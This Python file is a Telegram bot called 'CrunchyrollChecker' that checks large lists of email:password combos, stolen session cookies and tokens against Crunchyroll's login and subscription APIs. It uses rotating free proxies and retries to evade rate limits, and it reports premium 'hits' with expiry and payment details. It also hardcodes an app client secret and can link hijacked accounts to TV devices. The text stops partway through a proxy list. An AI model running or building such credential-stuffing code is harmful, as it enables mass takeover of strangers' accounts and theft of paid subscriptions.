#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrunchyrollChecker — UNIFIED PREMIUM BOT V1 — BlazeNXT
====================================================================
v1:
  • Instant startup — background proxy refresh (fixes 5min delay)
  • Flask health server for Railway PORT binding (/health, /stats, /)
  • Proxy v2: scoring persistence, URL import, smart ranking, fallback
  • Checker v2: combo cleaner/dedup, retry with new proxy, dynamic threads,
               CPM smoothing, pause/resume, queue, daily stats, history
  • UI v2: Tools menu, Proxy Stats, Daily Stats, History, Clean Duplicates,
           Export options, Pause/Resume, enhanced status
  • Security: ban/unban, broadcast, better rate limiting, sanitized logs
  • Stability: auto-restart wrapper, better error handling, log rotation
"""

import os
import re
import sys
import csv
import json
import time
import base64
import random
import asyncio
import logging
import tempfile
import threading
import requests
import uuid
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from collections import deque, Counter, defaultdict

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip3 install requests")
    sys.exit(1)

try:
    from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, RetryAfter
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        CallbackQueryHandler,
        ContextTypes,
        filters,
    )
except ImportError:
    print("[!] pip3 install python-telegram-bot==22.8")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    import socks  # noqa: F401
    SOCKS5_OK = True
except ImportError:
    SOCKS5_OK = False

# Optional Flask for health server
try:
    from flask import Flask, jsonify, request
    from flask_cors import CORS
    FLASK_OK = True
except ImportError:
    FLASK_OK = False
    Flask = None

# ===================== CONFIG (env-driven) =====================
def _load_dotenv() -> None:
    env_path = Path(__file__).resolve().parent / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip("'\"")
            if key and key not in os.environ:
                os.environ[key] = val
    except OSError:
        pass

def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "":
        return default
    return str(v).strip()

_load_dotenv()

BOT_TOKEN = _env("BOT_TOKEN")
try:
    OWNER_ID = int(_env("OWNER_ID", "0") or 0)
except ValueError:
    OWNER_ID = 0
OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")
_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
ADMIN_IDS = set()
if _raw_ids:
    for _x in _raw_ids.split(","):
        _x=_x.strip()
        if _x.isdigit():
            try:
                ADMIN_IDS.add(int(_x))
            except: pass
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)
_raw_un = _env("ADMIN_USERNAMES", "") or _env("ADMIN_USERNAME", "")
ADMIN_USERNAMES = set()
if _raw_un:
    for _u in _raw_un.split(","):
        _u=_u.strip().lstrip("@").lower()
        if _u:
            ADMIN_USERNAMES.add(_u)
if OWNER_USERNAME and OWNER_USERNAME.lstrip("@"):
    ADMIN_USERNAMES.add(OWNER_USERNAME.lstrip("@").lower())

def is_admin(uid: int, username: str = None) -> bool:
    try:
        if uid and OWNER_ID and uid == OWNER_ID:
            return True
        if uid and uid in ADMIN_IDS:
            return True
    except Exception:
        pass
    if username:
        try:
            un = str(username).lstrip("@").lower().strip()
            if un and un in ADMIN_USERNAMES:
                return True
        except Exception:
            pass
    try:
        store_obj = globals().get("STORE")
        if store_obj and hasattr(store_obj, 'get_setting'):
            dyn_ids = store_obj.get_setting("admin_ids", []) or []
            try:
                if uid and uid in dyn_ids:
                    return True
                if uid and str(uid) in [str(x) for x in dyn_ids]:
                    return True
            except Exception:
                pass
            dyn_uns = store_obj.get_setting("admin_usernames", []) or []
            if username and dyn_uns:
                try:
                    low = str(username).lstrip("@").lower().strip()
                    for x in dyn_uns:
                        if str(x).lower().strip() == low:
                            return True
                except Exception:
                    pass
    except Exception:
        pass
    return False

def is_owner(uid: int) -> bool:
    try:
        return bool(OWNER_ID and uid and uid == OWNER_ID)
    except Exception:
        return False

DATA_DIR = Path("data")
DATA_DIR.mkdir(parents=True, exist_ok=True)

PORT = int(_env("PORT", "8000") or 8000)
THREADS = 150
PROXY_REFRESH_MINUTES = 3
MAX_PROXIES_TO_KEEP = 3000
PROXY_TEST_TIMEOUT = 1
PROXY_TEST_SAMPLE = 8000
CHECK_TIMEOUT = 10
USER_LAST_CHECK: dict = {}
STOP_REQUEST: dict = {}
PAUSE_REQUEST: dict = {}
ACTIVE_CHECK_MSG: dict = {}
CHECK_QUEUE: dict = {}  # uid -> list of queued texts
USER_LOCK = threading.Lock()
SECURE_LOG = True
MAX_FILE_MB = 100  # unlimited - 100MB ~1M combos
PREMIUM_ONLY_DEFAULT = True
MAX_PASTED_CREDS = 1000000  # UNLIMITED file check - removed 5000 limit
MAX_PASTED_PROXIES = 10000  # upgraded from 5000
MAX_THREADS_USER = 500
MAX_HIT_CARDS = 150
ENABLE_HEALTH = _env("ENABLE_HEALTH", "1") != "0"

START_TIME = time.time()
CHECKS_DONE = 0
CHECKS_LOCK = threading.Lock()
TOTAL_HITS = 0
TOTAL_HITS_LOCK = threading.Lock()

# CPM smoothing
CPM_HISTORY = deque(maxlen=20)

# Daily stats
DAILY_STATS_FILE = DATA_DIR / "daily_stats.json"
PROXY_SCORES_FILE = DATA_DIR / "proxy_scores.json"
HISTORY_FILE = DATA_DIR / "check_history.json"
BAN_FILE = DATA_DIR / "banned.json"

def bump_checks(n: int) -> None:
    global CHECKS_DONE
    with CHECKS_LOCK:
        CHECKS_DONE += n

def bump_hits(n: int) -> None:
    global TOTAL_HITS
    with TOTAL_HITS_LOCK:
        TOTAL_HITS += n

def uptime() -> str:
    s = int(time.time() - START_TIME)
    d, r = divmod(s, 86400)
    h, r = divmod(r, 3600)
    m, sec = divmod(r, 60)
    parts = []
    if d:
        parts.append(f"{d}d")
    if h:
        parts.append(f"{h}h")
    parts.append(f"{m}m {sec}s")
    return " ".join(parts)

def _fmt_duration(sec: float) -> str:
    sec = int(sec)
    if sec < 0:
        sec = 0
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"

def _fmt_cpm(processed: int, elapsed: float) -> int:
    if elapsed <= 0 or processed <= 0:
        return 0
    return int(processed / elapsed * 60)

def _fmt_cpm_smooth(processed: int, elapsed: float) -> int:
    cpm = _fmt_cpm(processed, elapsed)
    if cpm > 0:
        CPM_HISTORY.append(cpm)
    if CPM_HISTORY:
        return int(sum(CPM_HISTORY) / len(CPM_HISTORY))
    return cpm

def _fmt_eta(total: int, processed: int, cpm: int) -> str:
    if cpm <= 0 or total <= processed:
        return "—"
    remaining = total - processed
    eta_sec = int(remaining * 60 / cpm)
    return _fmt_duration(eta_sec)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("CrunchyBot")

# ===================== SMALL HELPERS =====================
def esc(v) -> str:
    if v is None or v == "":
        return "N/A"
    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def parse_iso(s) -> Optional[datetime]:
    if not s:
        return None
    try:
        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except (ValueError, TypeError):
        return None

def fmt_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "N/A"
    return dt.astimezone(timezone.utc).strftime("%d-%m-%Y %H:%M UTC")

def days_left_until(iso_date: str) -> str:
    if not iso_date:
        return "N/A"
    dt = parse_iso(iso_date)
    if not dt:
        return "N/A"
    return str(max(0, (dt - now_utc()).days))

def generate_code() -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(random.choice(chars) for _ in range(12))

def _clean_err(e) -> str:
    return " ".join(str(e).split())[:80]

def flag_emoji(cc) -> str:
    cc = (cc or "").upper().strip()
    if len(cc) != 2 or not cc.isalpha():
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)

def sanitize_log(text: str) -> str:
    """Hide credentials in logs"""
    if not SECURE_LOG:
        return text
    # hide email:pass patterns
    return re.sub(r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s]+)", r"\1:***", text)

# ===================== CRUNCHYROLL API =====================
API_HOST = "https://beta-api.crunchyroll.com"
CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"

APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
APP_DEVICE_TYPE = "Google SDK built for x86"
APP_DEVICE_NAME = "sdk_google_atv_x86"
BARO_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
PLAN_BY_STREAMS = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}
BILLING_MAP = {"P1D": "Daily", "P1W": "Weekly", "P1M": "Monthly", "P3M": "3 Months", "P1Y": "Annual"}

COUNTRY_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovin", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}

_tls = threading.local()

def get_session() -> requests.Session:
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"Accept-Encoding": "gzip", "Connection": "keep-alive"})
        try:
            retry = Retry(total=1, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504])
            adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retry, pool_block=False)
            s.mount("https://", adapter)
            s.mount("http://", adapter)
        except Exception:
            s.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
            s.mount("http://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
        _tls.s = s
    return s

def _req(session, method, url, proxy, **kw):
    try:
        return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
    except requests.RequestException:
        if proxy:
            return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
        raise

def _blank_data(user: str) -> dict:
    return {
        "user": user.split("@")[0] if user else "", "verified": False,
        "plan": "", "sku": "", "streams": "", "expiry": "", "days_left": "N/A",
        "renew": False, "trial": False, "duration": "", "price": "",
        "currency": "", "plan_type": "", "created": "", "payment": "",
        "cc": "", "country_name": "", "info": "",
        "account_id": "", "external_id": "", "sub_id": "", "sub_status": "",
        "next_renewal": "", "start_date": "", "billing_cycle": "",
        "payment_method": "", "benefits": "", "checked_at": "",
        "proxy_used": "", "response_time": "",
    }

# ---------------- App-API login (Baron flow) ----------------
def app_login(user: str, pw: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy, data={
            "grant_type": "password",
            "username": user, "password": pw,
            "scope": "offline_access",
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "device_type": APP_DEVICE_TYPE,
            "device_id": str(uuid.uuid4()),
            "device_name": APP_DEVICE_NAME,
        }, headers={
            "User-Agent": APP_UA,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": str(uuid.uuid4()),
            "Request-Type": "SignIn",
        })
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    src = r.text or ""
    low = src.lower()
    if r.status_code == 429 or "too_many_requests" in src or "rate limited" in low:
        return None, "rate"
    if any(x in low for x in ("two_factor", "2fa", "mfa_required", "otp_required", "otp_code", "verification_required")):
        return None, "2fa"
    if "invalid_grant" in src or "invalid_credentials" in src or r.status_code in (400, 401):
        return None, "bad"
    try:
        j = r.json()
    except ValueError:
        return None, f"json fail ({r.status_code})"
    if r.status_code != 200 or not isinstance(j, dict) or not j.get("access_token"):
        return None, "no token"
    return j, "ok"

# ---------------- App-API account check (the HITTER) ----------------
def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
    d = _blank_data(user)
    start_t = time.time()
    j, st = app_login(user, pw, proxy)
    if j is None:
        if st == "bad":
            return "bad", d
        if st == "rate":
            return "rate", d
        if st == "2fa":
            return "2fa", d
        return "err", d
    tk = j["access_token"]
    hdr = {
        "Authorization": f"Bearer {tk}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    s = get_session()

    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me/multiprofile", proxy, headers=hdr)
        mp = r.json()
        if isinstance(mp, dict):
            profiles = mp.get("profiles") or []
            primary = next((p for p in profiles if p.get("is_primary")), None)
            if not primary and profiles:
                primary = profiles[0]
            if primary and primary.get("profile_name"):
                d["user"] = primary["profile_name"]
    except (requests.RequestException, ValueError):
        pass

    me = {}
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
        me = r.json()
    except (requests.RequestException, ValueError):
        pass
    if isinstance(me, dict):
        d["verified"] = bool(me.get("email_verified"))
        if me.get("username") and d["user"] == (user.split("@")[0] if user else ""):
            d["user"] = me["username"]
    ext = me.get("external_id", "") if isinstance(me, dict) else ""
    acc = me.get("account_id", "") if isinstance(me, dict) else ""
    if not ext:
        d["response_time"] = f"{(time.time()-start_t):.2f}s"
        return "free", d

    try:
        r = _req(s, "GET", f"{API_HOST}/subs/v1/subscriptions/{ext}/benefits", proxy, headers=hdr)
        bsrc = r.text if r.status_code == 200 else ""
    except requests.RequestException:
        bsrc = ""
    if not bsrc or any(x in bsrc for x in (
        "subscription.not_found", "Subscription Not Found",
        '"total":0', '"subscription_country":""',
    )) or "concurrent_streams" not in bsrc:
        d["response_time"] = f"{(time.time()-start_t):.2f}s"
        return "free", d

    d["account_id"] = acc or ""
    d["external_id"] = ext or ""
    d["benefits"] = bsrc[:500] if bsrc else ""
    m = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
    if m:
        d["streams"] = m.group(1)
        d["plan"] = PLAN_BY_STREAMS.get(m.group(1), f"Plan {m.group(1)}")
    m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["cc"] = m.group(1)
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
    m = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["payment"] = m.group(1)
        d["payment_method"] = m.group(1)

    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v3/subscriptions/{acc}", proxy, headers=hdr)
            s3 = r.text or ""
            m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', s3)
            if m:
                d["expiry"] = m.group(1)
                d["days_left"] = days_left_until(m.group(1))
            m = re.search(r'"auto_renew"\s*:\s*(true|false)', s3)
            if m:
                d["renew"] = m.group(1) == "true"
            m = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sku"] = m.group(1)
            m = re.search(r'"subscription_id"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_id"] = m.group(1)
            m = re.search(r'"status"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_status"] = m.group(1)
        except requests.RequestException:
            pass

    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{acc}/subscriptions", proxy, headers=hdr)
            v4 = r.json()
            if isinstance(v4, dict):
                subs4 = v4.get("subscriptions") or []
                sub4 = subs4[0] if subs4 else {}
                plan4 = sub4.get("plan") or {}
                price4 = plan4.get("price") or {}
                if sub4.get("nextRenewalDate") and not d["expiry"]:
                    d["expiry"] = sub4["nextRenewalDate"][:10]
                    d["days_left"] = days_left_until(sub4["nextRenewalDate"])
                if sub4.get("startDate"):
                    d["created"] = sub4["startDate"][:10]
                d["trial"] = bool(plan4.get("activeFreeTrial"))
                if plan4.get("planType"):
                    d["plan_type"] = plan4["planType"]
                cyc = price4.get("cycleDuration") or ""
                if cyc:
                    d["duration"] = BILLING_MAP.get(cyc, cyc)
                if price4.get("amount") is not None:
                    d["price"] = str(price4["amount"])
                    d["currency"] = price4.get("currencyCode", "")
                d["billing_cycle"] = price4.get("cycleDuration") or d.get("duration", "")
                d["next_renewal"] = sub4.get("nextRenewalDate", "")[:10] if sub4.get("nextRenewalDate") else d.get("expiry", "")
                d["start_date"] = sub4.get("startDate", "")[:10] if sub4.get("startDate") else d.get("created", "")
                d["sub_status"] = sub4.get("status", "") or d.get("sub_status", "")
                d["sub_id"] = sub4.get("subscriptionId", "") or sub4.get("id", "") or d.get("sub_id", "")
                pay = v4.get("currentPaymentMethod") or {}
                if pay.get("name") and not d["payment"]:
                    d["payment"] = pay["name"]
                d["payment_method"] = pay.get("name", "") or d.get("payment", "")
        except (requests.RequestException, ValueError):
            pass
    d["response_time"] = f"{(time.time()-start_t):.2f}s"
    d["checked_at"] = now_utc().isoformat()
    if proxy:
        try:
            d["proxy_used"] = (proxy.get("https") or proxy.get("http") or "")[:60]
        except:
            d["proxy_used"] = "unknown"
    return "hit", d

def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):
    """Smart retry: auto proxies discard after use, manual high-level reuse. Now with 2 retries and scoring."""
    st, d = check_account_app(user, pw, proxy)
    if st in ("hit", "free") and proxy:
        try:
            bump_proxy_score(proxy.get("https",""), 1)
        except:
            pass
    if st in ("rate", "err") and tries > 1:
        if proxy:
            try:
                bump_proxy_score(proxy.get("https",""), -2)
            except:
                pass
        for attempt in range(tries-1):
            try:
                new_proxy = None
                with PROXY_LOCK:
                    if LIVE_PROXIES:
                        auto_indices = [i for i, p in enumerate(LIVE_PROXIES) if p.get("https") not in MANUAL_PROXY_URLS]
                        if auto_indices:
                            try:
                                idx = random.choice(auto_indices)
                                new_proxy = LIVE_PROXIES.pop(idx)
                                AUTO_PROXY_URLS.discard(new_proxy.get("https",""))
                            except:
                                pass
                        else:
                            try:
                                new_proxy = random.choice(LIVE_PROXIES) if LIVE_PROXIES else None
                            except:
                                new_proxy = None
                if new_proxy and new_proxy != proxy:
                    time.sleep(0.1 + random.random()*0.2)
                    st2, d2 = check_account_app(user, pw, new_proxy)
                    if st2 not in ("rate", "err"):
                        if st2 in ("hit", "free"):
                            bump_proxy_score(new_proxy.get("https",""), 2)
                        elif st2 == "bad":
                            bump_proxy_score(new_proxy.get("https",""), 1)
                        return st2, d2
                    try:
                        bump_proxy_score(new_proxy.get("https",""), -1)
                    except:
                        pass
            except:
                pass
    return st, d

# ---------------- Token / cookie checks ----------------
def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
    s = get_session()
    data = {
        "grant_type": "etp_rt_cookie",
        "device_id": str(uuid.uuid4()),
        "device_type": "Firefox on Windows",
    }
    headers = {
        "User-Agent": BARO_WUA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/",
    }
    try:
        r = s.post(
            f"{API_HOST}/auth/v1/token", data=data, headers=headers,
            cookies={"etp_rt": etp_rt}, timeout=CHECK_TIMEOUT, proxies=proxy,
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    try:
        j = r.json()
    except ValueError:
        return None, f"http_{r.status_code}"
    if r.status_code != 200 or not isinstance(j, dict) or "access_token" not in j:
        return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
    return j, ""

def cr_me(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    if r.status_code in (401, 403):
        return None, f"http_{r.status_code}"
    if r.status_code != 200:
        return None, f"http_{r.status_code}"
    try:
        return r.json(), ""
    except ValueError:
        return None, "bad_json"

def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
    if not account_id:
        return None
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None

def cr_profiles(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me/multiprofile",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None

def is_token_expired(token: str) -> bool:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        exp = data.get("exp")
        return bool(exp and int(exp) < time.time())
    except Exception:
        return False

def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
    me_data, merr = cr_me(bearer, proxy)
    if not me_data:
        return "err", dict(_blank_data(""), info=merr or "me_failed")
    acc = me_data.get("account_id")
    sub_data = cr_subscriptions(acc, bearer, proxy)
    prof_data = cr_profiles(bearer, proxy)

    subs = (sub_data or {}).get("subscriptions") or []
    active = next((x for x in subs if str(x.get("status", "")).lower() == "active"), None)
    premium = active is not None
    if not premium and me_data.get("external_id"):
        try:
            s = get_session()
            r = _req(s, "GET",
                     f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
                     proxy,
                     headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA})
            if r.status_code == 200 and "concurrent_streams" in (r.text or ""):
                premium = True
        except requests.RequestException:
            pass

    d = _blank_data(me_data.get("email") or "")
    d["user"] = me_data.get("email") or me_data.get("username") or d["user"]
    d["verified"] = bool(me_data.get("email_verified"))
    profiles = (prof_data or {}).get("profiles") or []
    primary = next((p for p in profiles if p.get("is_primary")), None)
    if primary and primary.get("profile_name"):
        d["user"] = primary["profile_name"]
    if active:
        plan = active.get("plan") or {}
        price = plan.get("price") or {}
        d["plan"] = (plan.get("tier") or {}).get("text") or active.get("sku") or "Premium"
        for b in plan.get("benefits") or []:
            nm = str(b.get("name", "")) if isinstance(b, dict) else ""
            if nm.startswith("concurrent_streams"):
                m = re.search(r"(\d+)$", nm)
                if m:
                    d["streams"] = m.group(1)
                break
        d["cc"] = plan.get("countryCode") or ""
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
        cyc = price.get("cycleDuration") or ""
        d["duration"] = BILLING_MAP.get(cyc, cyc)
        d["currency"] = price.get("currencyCode") or ""
        d["price"] = str(price.get("amount", ""))
        d["trial"] = bool(plan.get("activeFreeTrial"))
        d["plan_type"] = plan.get("planType") or ""
        d["expiry"] = (active.get("nextRenewalDate") or "")[:10]
        d["days_left"] = days_left_until(active.get("nextRenewalDate") or "")
        d["created"] = (active.get("startDate") or "")[:10]
        d["renew"] = active.get("subscriptionQualifier") == "RECURRING"
        pay = (sub_data or {}).get("currentPaymentMethod") or {}
        d["payment"] = pay.get("name") or ""
    return ("hit" if premium else "free"), d

def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
    t = cred.get("type")
    try:
        if t == "email":
            st, d = check_account_app_retry(cred["value"], cred.get("password", ""), proxy, tries=2)
            return {"st": st, "data": d}
        if t == "cookie":
            j, err = etp_rt_to_token(cred["value"], proxy)
            if not j:
                return {"st": "err", "data": dict(_blank_data(""), info=err)}
            st, d = check_token_or_cookie(j["access_token"], proxy)
            return {"st": st, "data": d}
        if t == "token":
            if is_token_expired(cred["value"]):
                return {"st": "err", "data": dict(_blank_data(""), info="expired token")}
            st, d = check_token_or_cookie(cred["value"], proxy)
            return {"st": st, "data": d}
    except Exception as e:
        return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
    return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}

def activate_tv(bearer: str, code: str):
    s = get_session()
    last_err = "no_hosts_tried"
    for base in (API_HOST, "https://www.crunchyroll.com"):
        try:
            r = s.post(
                f"{base}/auth/v1/device",
                json={"user_code": code},
                headers={
                    "Authorization": f"Bearer {bearer}",
                    "User-Agent": BARO_WUA,
                    "Content-Type": "application/json",
                },
                timeout=20,
            )
            if r.status_code == 200:
                return True, ""
            last_err = f"http_{r.status_code}"
            try:
                j = r.json()
                if isinstance(j, dict) and j.get("code"):
                    last_err = str(j["code"])
            except ValueError:
                pass
        except requests.RequestException as e:
            last_err = f"network: {_clean_err(e)}"
    return False, last_err

# ===================== PROXY POOL v2 =====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
